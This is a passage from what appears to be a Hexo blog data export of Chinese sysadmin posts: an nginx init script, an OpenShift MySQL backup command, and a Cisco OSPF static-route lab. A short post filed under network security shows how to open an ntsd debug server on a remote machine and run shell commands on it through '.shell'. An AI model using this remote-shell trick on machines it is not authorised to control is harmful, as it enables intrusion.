stop\nRETVAL=$?\nif [ $RETVAL -ne 0 ]\nthen\necho \"Shutdown failure\"\nelse\necho \"Shutdown success\"\nfi\nfi\n}\ncase \"$1\" in\nstart)\nstart\n;;\nstop)\nstop\n;;\nstatus)\nstatus $nginx\nRETVAL=$?\n;;\nrestart)\nstop\nstart\n;;\nreload)\nreload\n;;\n*)\necho \"Usage: $prog {start|stop|restart|status|reload}\"\nexit 1\nesac\nexit $RETVAL\n添加权限和添加自启动\n[root@key1088 init.d]# chmod 755 nginx\n[root@key1088 init.d]# chkconfig --add nginx\n[root@key1088 init.d]# chkconfig --list nginx\nnginx           0:off   1:off   2:off   3:off   4:off   5:off   6:off\n[root@key1088 init.d]# chkconfig --level 235 nginx on\n[root@key1088 init.d]# chkconfig --list nginx\nnginx           0:off   1:off   2:on    3:on    4:off   5:on    6:off\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>昨天晚上VPS重启了，NGINX没有起来。于是写了一下脚本，自启动的。</p>\n<pre>\ncat /etc/init.d/nginx\n#!/bin/sh\n#\n# nginx       This shell script takes care of starting and stopping\n#               the nginx.\n#\n# chkconfig: - 64 36\n# description:  nginx.\n# processname: nginx\n# config: /usr/local/nginx/conf/nginx\n# pidfile: /usr/local/nginx/logs/nginx.pid\nif [ -f /etc/init.d/functions ]\nthen\n. /etc/init.d/functions\nelif [ -f /etc/rc.d/init.d/functions ]\nthen\n. /etc/rc.d/init.d/functions\nelse\nexit 0\nfi\nnginx=/usr/local/nginx/sbin/nginx\nconf=/usr/local/nginx/conf/nginx\nprog=nginx\nRETVAL=0\nstart() {\nif [ -n \"`/sbin/pidof $prog`\" ]\nthen\necho \"$prog: already running\"\nreturn 1\nfi\necho \"Starting $prog:\"\nbase=$prog\n$nginx\nif [ -z \"`/sbin/pidof $prog`\" ]\nthen\nRETVAL=1\nfi\nif [ $RETVAL -ne 0 ]\nthen\necho \"Startup failure\"\nelse\necho \"Startup success\"\nfi\nreturn $RETVAL\n}\nreload() {\nif [ -z \"`/sbin/pidof $prog`\" ]\nthen\nRETVAL=1\nfi\nif [ $RETVAL -ne 0 ]\nthen\necho \"nginx no have run\"\nelse\necho \"reload nginx config\"\n$nginx -s reload\nRETVAL=$?\nif [ $RETVAL -ne 0 ]\nthen\necho \"reload nginx config failure\"\nelse\necho \"reload nginx config success\"\nfi\nfi\n}\nstop() {\nif [ -z \"`/sbin/pidof $prog`\" ]\nthen\nRETVAL=1\nfi\nif [ $RETVAL -ne 0 ]\nthen\necho \"nginx no have run\"\nelse\necho \"Stopping $prog:\"\n$nginx -s stop\nRETVAL=$?\nif [ $RETVAL -ne 0 ]\nthen\necho \"Shutdown failure\"\nelse\necho \"Shutdown success\"\nfi\nfi\n}\ncase \"$1\" in\nstart)\nstart\n;;\nstop)\nstop\n;;\nstatus)\nstatus $nginx\nRETVAL=$?\n;;\nrestart)\nstop\nstart\n;;\nreload)\nreload\n;;\n*)\necho \"Usage: $prog {start|stop|restart|status|reload}\"\nexit 1\nesac\nexit $RETVAL\n添加权限和添加自启动\n[root@key1088 init.d]# chmod 755 nginx\n[root@key1088 init.d]# chkconfig --add nginx\n[root@key1088 init.d]# chkconfig --list nginx\nnginx           0:off   1:off   2:off   3:off   4:off   5:off   6:off\n[root@key1088 init.d]# chkconfig --level 235 nginx on\n[root@key1088 init.d]# chkconfig --list nginx\nnginx           0:off   1:off   2:on    3:on    4:off   5:on    6:off\n</pre>"},{"title":"openshift 备份MYSQL数据库","date":"2013-04-13T07:55:39.000Z","_content":"openshift paas\n<pre>\nmysqldump --password=$OPENSHIFT_DB_PASSWORD -h $OPENSHIFT_DB_HOST -P $OPENSHIFT_DB_PORT -u $OPENSHIFT_DB_USERNAME $OPENSHIFT_GEAR_NAME --add-drop-table >  $OPENSHIFT_DATA_DIR/$OPENSHIFT_GEAR_NAME.sql\n</pre>","source":"_posts/openshift-备份MYSQL数据库.md","raw":"title: openshift 备份MYSQL数据库\ncategories: [数据库]\ntags: [backup,mysql,openshift,paas]\ndate: 2013-04-13 15:55:39\n---\nopenshift paas\n<pre>\nmysqldump --password=$OPENSHIFT_DB_PASSWORD -h $OPENSHIFT_DB_HOST -P $OPENSHIFT_DB_PORT -u $OPENSHIFT_DB_USERNAME $OPENSHIFT_GEAR_NAME --add-drop-table >  $OPENSHIFT_DATA_DIR/$OPENSHIFT_GEAR_NAME.sql\n</pre>","slug":"openshift-备份MYSQL数据库","published":1,"updated":"2023-04-22T05:38:44.858Z","_id":"clgrjlxi9004y7opi093s8taz","comments":1,"layout":"post","photos":[],"link":"","content":"<p>openshift paas</p>\n<pre>\nmysqldump --password=$OPENSHIFT_DB_PASSWORD -h $OPENSHIFT_DB_HOST -P $OPENSHIFT_DB_PORT -u $OPENSHIFT_DB_USERNAME $OPENSHIFT_GEAR_NAME --add-drop-table >  $OPENSHIFT_DATA_DIR/$OPENSHIFT_GEAR_NAME.sql\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>openshift paas</p>\n<pre>\nmysqldump --password=$OPENSHIFT_DB_PASSWORD -h $OPENSHIFT_DB_HOST -P $OPENSHIFT_DB_PORT -u $OPENSHIFT_DB_USERNAME $OPENSHIFT_GEAR_NAME --add-drop-table >  $OPENSHIFT_DATA_DIR/$OPENSHIFT_GEAR_NAME.sql\n</pre>"},{"title":"ntsd 应用技巧","date":"2011-05-17T04:58:00.000Z","_content":"<p>远程机:ntsd -server tcp:port=1234 calc.exe</p><p>本机:ntsd -remote tcp:server=IP,port=1234</p><p>.shell</p><p>命令</p><p></p>","source":"_posts/ntsd-应用技巧.md","raw":"title: ntsd 应用技巧\ncategories: [网络安全]\ntags: []\ndate: 2011-05-17 12:58:00\n---\n<p>远程机:ntsd -server tcp:port=1234 calc.exe</p><p>本机:ntsd -remote tcp:server=IP,port=1234</p><p>.shell</p><p>命令</p><p></p>","slug":"ntsd-应用技巧","published":1,"updated":"2023-04-22T05:38:44.855Z","_id":"clgrjlxia00517opi5yvhdk9f","comments":1,"layout":"post","photos":[],"link":"","content":"<p>远程机:ntsd -server tcp:port=1234 calc.exe</p><p>本机:ntsd -remote tcp:server=IP,port=1234</p><p>.shell</p><p>命令</p><p></p>","site":{"data":{}},"excerpt":"","more":"<p>远程机:ntsd -server tcp:port=1234 calc.exe</p><p>本机:ntsd -remote tcp:server=IP,port=1234</p><p>.shell</p><p>命令</p><p></p>"},{"title":"osfp中发布静态路由","date":"2010-03-22T10:45:00.000Z","_content":"拓扑图如下：<br /><br /><img src=\"/images/pic/007d91fb4e745039d9f9fdcf.jpg\" small=\"0\" /><br /><br /><br />配置如下：<br />R1#sh running-config<br />Building configuration...<br /><br />Current configuration:<br />!<br />version 12.1<br />service timestamps debug uptime<br />service timestamps log uptime<br />no service password-encryption<br />!<br />hostname R1<br />!<br />!<br />!<br />!<br />!<br />!<br />memory-size iomem 15<br />ip subnet-zero<br />!<br />!<br />!<br />!<br />interface Loopback0<br />ip address 1.1.1.1 255.255.255.0<br />!<br />interface Loopback1<br />ip address 3.3.3.3 255.255.255.0<br />!<br />interface FastEthernet0/0<br />no ip address<br />shutdown<br />duplex auto<br />speed auto<br />!<br />interface FastEthernet0/1<br />ip address 192.168.1.1 255.255.255.0<br />duplex auto<br />speed auto<br />!<br />router ospf 1<br />log-adjacency-changes<br />redistribute static subnets<br />!<br />ip classless<br />ip route 2.2.2.0 255.255.255.0 192.168.1.2<br />ip route 4.4.4.0 255.255.255.0 192.168.1.2<br />ip route 172.16.0.0 255.255.0.0 192.168.1.2<br />no ip http server<br />!<br />!<br />line con 0<br />transport input none<br />line aux 0<br />line vty 0 4<br />login<br />!<br />end<br /><br /><br /><br />R2#sh running-config<br />Building configuration...<br /><br />Current configuration:<br />!<br />version 12.1<br />service timestamps debug uptime<br />service timestamps log uptime<br />no service password-encryption<br />!<br />hostname R2<br />!<br />!<br />!<br />!<br />!<br />!<br />memory-size iomem 15<br />ip subnet-zero<br />!<br />!<br />!<br />!<br />interface Ethernet1/0<br />ip address 192.168.1.2 255.255.255.0<br />!<br />interface Ethernet1/1<br />ip address 172.16.1.1 255.255.0.0<br />!<br />interface Ethernet1/2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1/3<br />no ip address<br />shutdown<br />!<br />router ospf 1<br />log-adjacency-changes<br />redistribute static subnets<br />network 172.16.0.0 0.0.255.255 area 0<br />network 192.168.1.0 0.0.0.255 area 0<br /><br />!<br />ip classless<br />ip route 1.1.1.0 255.255.255.0 192.168.1.1<br />ip route 3.3.3.0 255.255.255.0 192.168.1.1<br />no ip http server<br />!<br />!<br />line con 0<br />transport input none<br />line aux 0<br />line vty 0 4<br />login<br />!<br />end<br /><br /><br /><br />R3#sh running-config<br />Building configuration...<br /><br />Current configuration:<br />!<br />version 12.1<br />service timestamps debug uptime<br />service timestamps log uptime<br />no service password-encryption<br />!<br />hostname R3<br />!<br />!<br />!<br />!<br />!<br />!<br />memory-size iomem 15<br />ip subnet-zero<br />!<br />!<br />!<br />!<br />interface Loopback0<br />ip address 2.2.2.2 255.255.255.0<br />!<br />interface Loopback2<br />ip address 4.4.4.4 255.255.255.0<br />!<br />interface Ethernet1/0<br />ip address 172.16.1.2 255.255.0.0<br />!<br />interface Ethernet1/1<br />no ip address<br />shutdown<br />!<br />interface Ethernet1/2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1/3<br />no ip address<br />shutdown<br />!<br />router ospf 1<br />log-adjacency-changes<br />network 2.2.2.0 0.0.0.255 area 2<br />network 4.4.4.0 0.0.0.255 area 3<br />network 172.16.0.0 0.0.255.255 area 0<br />!<br />ip classless<br />no ip http server<br />!<br />!<br />line con 0<br />transport input none<br />line aux 0<br />line vty 0 4<br />login<br />!<br />end<br /><br />路由表显示<br /><br />R1#sh ip route<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0/24 is subnetted, 1 subnets<br />C&#160;&#160;&#160;&#160;&#160;&#160; 1.1.1.0 is directly connected, Loopback0<br />2.0.0.0/24 is subnetted, 1 subnets<br />S&#160;&#160;&#160;&#160;&#160;&#160; 2.2.2.0 [1/0] via 192.168.1.2<br />3.0.0.0/24 is subnetted, 1 subnets<br />C&#160;&#160;&#160;&#160;&#160;&#160; 3.3.3.0 is directly connected, Loopback1<br />4.0.0.0/24 is subnetted, 1 subnets<br />S&#160;&#160;&#160;&#160;&#160;&#160; 4.4.4.0 [1/0] via 192.168.1.2<br />S&#160;&#160;&#160; 172.16.0.0/16 [1/0] via 192.168.1.2<br />C&#160;&#160;&#160; 192.168.1.0/24 is directly connected, FastEthernet0/1<br /><br /><br /><br />R2#sh ip route<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0/24 is subnetted, 1 subnets<br />S&#160;&#160;&#160;&#160;&#160;&#160; 1.1.1.0 [1/0] via 192.168.1.1<br />2.0.0.0/32 is subnetted, 1 subnets<br />O IA&#160;&#160;&#160; 2.2.2.2 [110/11] via 172.16.1.2, 00:01:12, Ethernet1/1<br />3.0.0.0/24 is subnetted, 1 subnets<br />S&#160;&#160;&#160;&#160;&#160;&#160; 3.3.3.0 [1/0] via 192.168.1.1<br />4.0.0.0/32 is subnetted, 1 subnets<br />O IA&#160;&#160;&#160; 4.4.4.4 [110/11] via 172.16.1.2, 00:01:12, Ethernet1/1<br />C&#160;&#160;&#160; 172.16.0.0/16 is directly connected, Ethernet1/1<br />C&#160;&#160;&#160; 192.168.1.0/24 is directly connected, Ethernet1/0<br /><br /><br />R3#sh ip route<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0/24 is subnetted, 1 subnets<br />O E2&#160;&#160;&#160; 1.1.1.0 [110/20] via 172.16.1.1, 00:01:19, Ethernet1/0<br />2.0.0.0/24 is subnetted, 1 subnets<br />C&#160;&#160;&#160;&#160;&#160;&#160; 2.2.2.0 is directly connected, Loopback0<br />3.0.0.0/24 is subnetted, 1 subnets<br />O E2&#160;&#160;&#160; 3.3.3.0 [110/20] via 172.16.1.1, 00:01:19, Ethernet1/0<br />4.0.0.0/24 is subnetted, 1 subnets<br />C&#160;&#160;&#160;&#160;&#160;&#160; 4.4.4.0 is directly connected, Loopback2<br />C&#160;&#160;&#160; 172.16.0.0/16 is directly connected, Ethernet1/0<br />O&#160;&#160;&#160; 192.168.1.0/24 [110/20] via 172.16.1.1, 00:01:19, Ethernet1/0<br /><br />测试：<br /><br /><br />R1#ping 4.4.4.4<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 4.4.4.4, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5/5), round-trip min/avg/max = 12/19/28 ms<br />R1#ping 2.2.2.2<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 2.2.2.2, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5/5), round-trip min/avg/max = 8/15/28 ms<br /><br /><br /><br />R3#ping 1.1.1.1<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 1.1.1.1, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5/5), round-trip min/avg/max = 16/20/24 ms<br />R3#ping 3.3.3.3<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 3.3.3.3, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5/5), round-trip min/avg/max = 12/16/24 ms<br /><br /><br /><br />如有转载请写明出处http://hi.baidu.com/key1088。<br /><br /><br /><br /><br /><br />","source":"_posts/osfp中发布静态路由.md","raw":"title: osfp中发布静态路由\ncategories: [网络工程]\ntags: []\ndate: 2010-03-22 18:45:00\n---\n拓扑图如下：<br /><br /><img src=\"/images/pic/007d91fb4e745039d9f9fdcf.jpg\" small=\"0\" /><br /><br /><br />配置如下：<br />R1#sh running-config<br />Building configuration...<br /><br />Current configuration:<br />!<br />version 12.1<br />service timestamps debug uptime<br />service timestamps log uptime<br />no service password-encryption<br />!<br />hostname R1<br />!<br />!<br />!<br />!<br />!<br />!<br />memory-size iomem 15<br />ip subnet-zero<br />!<br />!<br />!<br />!<br />interface Loopback0<br />ip address 1.1.1.1 255.255.255.0<br />!<br />interface Loopback1<br />ip address 3.3.3.3 255.255.255.0<br />!<br />interface FastEthernet0/0<br />no ip address<br />shutdown<br />duplex auto<br />speed auto<br />!<br />interface FastEthernet0/1<br />ip address 192.168.1.1 255.255.255.0<br />duplex auto<br />speed auto<br />!<br />router ospf 1<br />log-adjacency-changes<br />redistribute static subnets<br />!<br />ip classless<br />ip route 2.2.2.0 255.255.255.0 192.168.1.2<br />ip route 4.4.4.0 255.255.255.0 192.168.1.2<br />ip route 172.16.0.0 255.255.0.0 192.168.1.2<br />no ip http server<br />!<br />!<br />line con 0<br />transport input none<br />line aux 0<br />line vty 0 4<br />login<br />!<br />end<br /><br /><br /><br />R2#sh running-config<br />Building configuration...<br /><br />Current configuration:<br />!<br />version 12.1<br />service timestamps debug uptime<br />service timestamps log uptime<br />no service password-encryption<br />!<br />hostname R2<br />!<br />!<br />!<br />!<br />!<br />!<br />memory-size iomem 15<br />ip subnet-zero<br />!<br />!<br />!<br />!<br />interface Ethernet1/0<br />ip address 192.168.1.2 255.255.255.0<br />!<br />interface Ethernet1/1<br />ip address 172.16.1.1 255.255.0.0<br />!<br />interface Ethernet1/2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1/3<br />no ip address<br />shutdown<br />!<br />router ospf 1<br />log-adjacency-changes<br />redistribute static subnets<br />network 172.16.0.0 0.0.255.255 area 0<br />network 192.168.1.0 0.0.0.255 area 0<br /><br />!<br />ip classless<br />ip route 1.1.1.0 255.255.255.0 192.168.1.1<br />ip route 3.3.3.0 255.255.255.0 192.168.1.1<br />no ip http server<br />!<br />!<br />line con 0<br />transport input none<br />line aux 0<br />line vty 0 4<br />login<br />!<br />end<br /><br /><br /><br />R3#sh running-config<br />Building configuration...<br /><br />Current configuration:<br />!<br />version 12.1<br />service timestamps debug uptime<br />service timestamps log uptime<br />no service password-encryption<br />!<br />hostname R3<br />!<br />!<br />!<br />!<br />!<br />!<br />memory-size iomem 15<br />ip subnet-zero<br />!<br />!<br />!<br />!<br />interface Loopback0<br />ip address 2.2.2.2 255.255.255.0<br />!<br />interface Loopback2<br />ip address 4.4.4.4 255.255.255.0<br />!<br />interface Ethernet1/0<br />ip address 172.16.1.2 255.255.0.0<br />!<br />interface Ethernet1/1<br />no ip address<br />shutdown<br />!<br />interface Ethernet1/2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1/3<br />no ip address<br />shutdown<br />!<br />router ospf 1<br />log-adjacency-changes<br />network 2.2.2.0 0.0.0.255 area 2<br />network 4.4.4.0 0.0.0.255 area 3<br />network 172.16.0.0 0.0.255.255 area 0<br />!<br />ip classless<br />no ip http server<br />!<br />!<br />line con 0<br />transport input none<br />line aux 0<br />line vty 0 4<br />login<br />!<br />end<br /><br />路由表显示<br /><br />R1#sh ip route<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0/24 is subnetted, 1 subnets<br />C&#160;&#160;&#160;&#160;&#160;&#160; 1.1.1.0 is directly connected, Loopback0<br />2.0.0.0/24 is subnetted, 1 subnets<br />S&#160;&#160;&#160;&#160;&#160;&#160; 2.2.2.0 [1/0] via 192.168.1.2<br />3.0.0.0/24 is subnetted, 1 subnets<br />C&#160;&#160;&#160;&#160;&#160;&#160; 3.3.3.0 is directly connected, Loopback1<br />4.0.0.0/24 is subnetted, 1 subnets<br />S&#160;&#160;&#160;&#160;&#160;&#160; 4.4.4.0 [1/0] via 192.168.1.2<br />S&#160;&#160;&#160; 172.16.0.0/16 [1/0] via 192.168.1.2<br />C&#160;&#160;&#160; 192.168.1.0/24 is directly connected, FastEthernet0/1<br /><br /><br /><br />R2#sh ip route<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0/24 is subnetted, 1 subnets<br />S&#160;&#160;&#160;&#160;&#160;&#160; 1.1.1.0 [1/0] via 192.168.1.1<br />2.0.0.0/32 is subnetted, 1 subnets<br />O IA&#160;&#160;&#160; 2.2.2.2 [110/11] via 172.16.1.2, 00:01:12, Ethernet1/1<br />3.0.0.0/24 is subnetted, 1 subnets<br />S&#160;&#160;&#160;&#160;&#160;&#160; 3.3.3.0 [1/0] via 192.168.1.1<br />4.0.0.0/32 is subnetted, 1 subnets<br />O IA&#160;&#160;&#160; 4.4.4.4 [110/11] via 172.16.1.2, 00:01:12, Ethernet1/1<br />C&#160;&#160;&#160; 172.16.0.0/16 is directly connected, Ethernet1/1<br />C&#160;&#160;&#160; 192.168.1.0/24 is directly connected, Ethernet1/0<br /><br /><br />R3#sh ip route<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0/24 is subnetted, 1 subnets<br />O E2&#160;&#160;&#160; 1.1.1.0 [110/20] via 172.16.1.1, 00:01:19, Ethernet1/0<br />2.0.0.0/24 is subnetted, 1 subnets<br />C&#160;&#160;&#160;&#160;&#160;&#160; 2.2.2.0 is directly connected, Loopback0<br />3.0.0.0/24 is subnetted, 1 subnets<br />O E2&#160;&#160;&#160; 3.3.3.0 [110/20] via 172.16.1.1, 00:01:19, Ethernet1/0<br />4.0.0.0/24 is subnetted, 1 subnets<br />C&#160;&#160;&#160;&#160;&#160;&#160; 4.4.4.0 is directly connected, Loopback2<br />C&#160;&#160;&#160; 172.16.0.0/16 is directly connected, Ethernet1/0<br />O&#160;&#160;&#160; 192.168.1.0/24 [110/20] via 172.16.1.1, 00:01:19, Ethernet1/0<br /><br />测试：<br /><br /><br />R1#ping 4.4.4.4<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 4.4.4.4, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5/5), round-trip min/avg/max = 12/19/28 ms<br />R1#ping 2.2.2.2<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 2.2.2.2, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5/5), round-trip min/avg/max = 8/15/28 ms<br /><br /><br /><br />R3#ping 1.1.1.1<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 1.1.1.1, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5/5), round-trip min/avg/max = 16/20/24 ms<br />R3#ping 3.3.3.3<br /><br />Type escape sequence to abort.<br />Sending 5, 100-byte ICMP Echos to 3.3.3.3, timeout is 2 seconds:<br />!!!!!<br />Success rate is 100 percent (5/5), round-trip min/avg/max = 12/16/24 ms<br /><br /><br /><br />如有转载请写明出处http://hi.baidu.com/key1088。<br /><br /><br /><br /><br /><br />","slug":"osfp中发布静态路由","published":1,"updated":"2023-04-22T05:38:44.869Z","_id":"clgrjlxii005e7opi87vl3qd4","comments":1,"layout":"post","photos":[],"link":"","content":"<p>拓扑图如下：<br /><br /><img src=\"/images/pic/007d91fb4e745039d9f9fdcf.jpg\" small=\"0\" /><br /><br /><br />配置如下：<br />R1#sh running-config<br />Building configuration…<br /><br />Current configuration:<br />!<br />version 12.1<br />service timestamps debug uptime<br />service timestamps log uptime<br />no service password-encryption<br />!<br />hostname R1<br />!<br />!<br />!<br />!<br />!<br />!<br />memory-size iomem 15<br />ip subnet-zero<br />!<br />!<br />!<br />!<br />interface Loopback0<br />ip address 1.1.1.1 255.255.255.0<br />!<br />interface Loopback1<br />ip address 3.3.3.3 255.255.255.0<br />!<br />interface FastEthernet0&#x2F;0<br />no ip address<br />shutdown<br />duplex auto<br />speed auto<br />!<br />interface FastEthernet0&#x2F;1<br />ip address 192.168.1.1 255.255.255.0<br />duplex auto<br />speed auto<br />!<br />router ospf 1<br />log-adjacency-changes<br />redistribute static subnets<br />!<br />ip classless<br />ip route 2.2.2.0 255.255.255.0 192.168.1.2<br />ip route 4.4.4.0 255.255.255.0 192.168.1.2<br />ip route 172.16.0.0 255.255.0.0 192.168.1.2<br />no ip http server<br />!<br />!<br />line con 0<br />transport input none<br />line aux 0<br />line vty 0 4<br />login<br />!<br />end<br /><br /><br /><br />R2#sh running-config<br />Building configuration…<br /><br />Current configuration:<br />!<br />version 12.1<br />service timestamps debug uptime<br />service timestamps log uptime<br />no service password-encryption<br />!<br />hostname R2<br />!<br />!<br />!<br />!<br />!<br />!<br />memory-size iomem 15<br />ip subnet-zero<br />!<br />!<br />!<br />!<br />interface Ethernet1&#x2F;0<br />ip address 192.168.1.2 255.255.255.0<br />!<br />interface Ethernet1&#x2F;1<br />ip address 172.16.1.1 255.255.0.0<br />!<br />interface Ethernet1&#x2F;2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1&#x2F;3<br />no ip address<br />shutdown<br />!<br />router ospf 1<br />log-adjacency-changes<br />redistribute static subnets<br />network 172.16.0.0 0.0.255.255 area 0<br />network 192.168.1.0 0.0.0.255 area 0<br /><br />!<br />ip classless<br />ip route 1.1.1.0 255.255.255.0 192.168.1.1<br />ip route 3.3.3.0 255.255.255.0 192.168.1.1<br />no ip http server<br />!<br />!<br />line con 0<br />transport input none<br />line aux 0<br />line vty 0 4<br />login<br />!<br />end<br /><br /><br /><br />R3#sh running-config<br />Building configuration…<br /><br />Current configuration:<br />!<br />version 12.1<br />service timestamps debug uptime<br />service timestamps log uptime<br />no service password-encryption<br />!<br />hostname R3<br />!<br />!<br />!<br />!<br />!<br />!<br />memory-size iomem 15<br />ip subnet-zero<br />!<br />!<br />!<br />!<br />interface Loopback0<br />ip address 2.2.2.2 255.255.255.0<br />!<br />interface Loopback2<br />ip address 4.4.4.4 255.255.255.0<br />!<br />interface Ethernet1&#x2F;0<br />ip address 172.16.1.2 255.255.0.0<br />!<br />interface Ethernet1&#x2F;1<br />no ip address<br />shutdown<br />!<br />interface Ethernet1&#x2F;2<br />no ip address<br />shutdown<br />!<br />interface Ethernet1&#x2F;3<br />no ip address<br />shutdown<br />!<br />router ospf 1<br />log-adjacency-changes<br />network 2.2.2.0 0.0.0.255 area 2<br />network 4.4.4.0 0.0.0.255 area 3<br />network 172.16.0.0 0.0.255.255 area 0<br />!<br />ip classless<br />no ip http server<br />!<br />!<br />line con 0<br />transport input none<br />line aux 0<br />line vty 0 4<br />login<br />!<br />end<br /><br />路由表显示<br /><br />R1#sh ip route<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0&#x2F;24 is subnetted, 1 subnets<br />C&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 1.1.1.0 is directly connected, Loopback0<br />2.0.0.0&#x2F;24 is subnetted, 1 subnets<br />S&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 2.2.2.0 [1&#x2F;0] via 192.168.1.2<br />3.0.0.0&#x2F;24 is subnetted, 1 subnets<br />C&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 3.3.3.0 is directly connected, Loopback1<br />4.0.0.0&#x2F;24 is subnetted, 1 subnets<br />S&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 4.4.4.0 [1&#x2F;0] via 192.168.1.2<br />S&amp;#160;&amp;#160;&amp;#160; 172.16.0.0&#x2F;16 [1&#x2F;0] via 192.168.1.2<br />C&amp;#160;&amp;#160;&amp;#160; 192.168.1.0&#x2F;24 is directly connected, FastEthernet0&#x2F;1<br /><br /><br /><br />R2#sh ip route<br />Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP<br />D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area<br />N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2<br />E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP<br />i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area<br />* - candidate default, U - per-user static route, o - ODR<br />P - periodic downloaded static route<br /><br />Gateway of last resort is not set<br /><br />1.0.0.0&#x2F;24 is subnetted, 1 subnets<br />S&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 1.1.1.0 [1&#x2F;0] via 192.168.1.1<br />2.0.0.0&#x2F;32 is subnetted, 1 subnets<br />O IA&amp;#160;&amp;#160;&amp;#160; 2.2.2.2 [110&#x2F;11] via 172.16.1.2, 00:01:12, Ethernet1&#x2F;1<br />3.0.0.0&#x2F;24 is subnetted, 1 subnets<br />S&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160; 3.3.3.0 [1&#x2F;0] via 192.168.1.1<br />4.0.0.0&#x2F;32 is subnetted, 1 subnets<br />O IA&amp;#160;&amp;#160;&amp;#160; 4.4.4.4 